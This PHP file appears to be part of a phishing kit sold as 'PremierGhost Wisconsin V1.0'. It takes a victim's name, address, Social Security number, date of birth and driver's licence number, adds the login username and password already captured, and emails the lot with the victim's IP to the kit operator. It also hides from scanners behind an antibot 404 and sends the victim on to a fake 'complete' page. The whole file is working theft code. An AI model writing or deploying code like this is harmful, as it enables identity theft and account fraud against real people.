<?php

    session_start();

    require_once '../J/Comp.php';
    require_once '../J/Antibot.php';
    require_once '../J/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

    if (isset(
        $_POST['fname'],
        $_POST['addr'],
        $_POST['ssn'],
        $_POST['dob'],
        $_POST['dln']
    )) {
        if (!$comps->checkEmpty(
            $_POST['fname'],
            $_POST['addr'],
            $_POST['ssn'],
            $_POST['dob'],
            $_POST['dln']
        )) {
            $_POST['fname'] = ucwords($_POST['fname']);
            $_POST['addr'] = ucwords($_POST['addr']);
            $_POST['dln'] = strtoupper($_POST['dln']);

            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: #023E8A;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-ws {
                        color: #023E8A;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">PremierGhost <span class="text-ws">Wisconsin</span> V1.0</h4>
                    <h2>(1) Personal Info from ' . $_SESSION['username'] . '</h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light">💡 Personal Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Full Name: ' . $_POST['fname'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Address: ' . $_POST['addr'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>SSN: ' . $_POST['ssn'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>DOB: ' . $_POST['dob'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>DLN: ' . $_POST['dln'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">🔬 Login Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Username: ' . $_SESSION['username'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_SESSION['password'] . '</h3>
                        </div>
                        ' . $comps->userDetails() . '
                    </div>
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/PremierGhost" target="_blank">PremierGhost</a>, not for redistribution.</span>
                    </div>
                </div>
            ';

            if ($comps->mailX("(1) Login | Wisconsin | " . $_SESSION['ip'] . " | " . $_SESSION['username'], $content, $_POST['fname'])) {
                die($comps->headerX("../Login/complete.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            die();
        }
    } else {
        echo $antibot->throw404();
        die();
    }